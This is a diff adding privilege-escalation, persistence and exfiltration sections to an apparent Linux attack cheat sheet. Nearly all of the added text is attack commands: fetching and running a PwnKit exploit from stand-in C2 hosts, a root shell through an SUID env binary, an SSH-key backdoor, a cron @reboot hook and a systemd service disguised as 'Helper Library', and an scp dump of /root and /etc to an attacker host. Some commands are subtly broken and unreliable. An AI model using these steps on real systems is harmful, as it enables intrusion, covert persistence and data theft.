@@ -155,8 +155,95 @@ msf6> sessions <id>
 
 ---
 
-## Privilege escalation / persistence
+## Privilege escalation
+
+- [GTFOBins](https://gtfobins.org/#+suid) – privilege escalation binaries
 
 Drop a ssh public key into *~/.ssh/authorized_keys* for a more stable backdoor compared to reverse shells
 
----
+```bash
+# discover unprotected ssh-backup-key file
+$ ls /etc/ssh
+
+# use the file to get root access
+$ ssh root@127.0.0.1 -i ssh-backup-key
+```
+
+```bash
+# detect an old & unpatched linux version
+$ uname -a
+
+# run exploit such as PwnKit
+$ wget http://malicious.site/pwnkit.sh | bash
+
+# compile & run
+$ wget http://c2-server.mal/pwnkit.c -O /tmp/pwnkit.c
+$ gcc /tmp/pwnkit.c -o /tmp/pwnkit
+$ chmod +x /tmp/pwnkit
+$ /tmp/pwnkit
+```
+
+```bash
+# detect an env binary with the SUID flag
+$ find /bin -perm 4000
+
+# use the SUID vulnerability to get root access
+$ /bin/env /bin/bash -p
+```
+
+## Persistence
+
+cron:
+
+- /etc/crontab
+- /etc/cron.d*
+- /var/spool/cron/*
+- /var/spool/crontab/*
+
+`crontab -e`
+
+Example entry:
+```
+@reboot nohup /home/<user>/.<hidden-dir>/malicious > /dev/null 2>&1 &
+```
+
+systemd:
+
+- /etc/systemd/system/*
+- /lib/systemd/system/*
+- /usr/lib/systemd/system/*
+- /run/systemd/system/*
+- /usr/local/lib/systemd/system/*
+- /etc/systemd/system.control/*
+- /run/systemd/system.control/*
+- /run/systemd/transient/*
+- /run/systemd/generator.early/*
+- /etc/systemd/system.attached/*
+- /run/systemd/system.attached/*
+- /run/systemd/generator/*
+- /run/systemd/generator.late/*
+
+Example service entry:
+
+/etc/systemd/system/helper.service
+
+```
+[Unit]
+Description=Helper Library
+Wants=netwoek-online.target
+After=network-online.target
+
+[Service]
+ExecStart=/var/lib/misc/malicious
+
+[Install]
+WantedBy=multi-user.target
+```
+
+## Exfiltration
+
+```bash
+# run as root
+$ tar czf dump.tar.gz /root /etc/
+$ scp dump.tar.gz attacker@c2-server.mal:~
+```
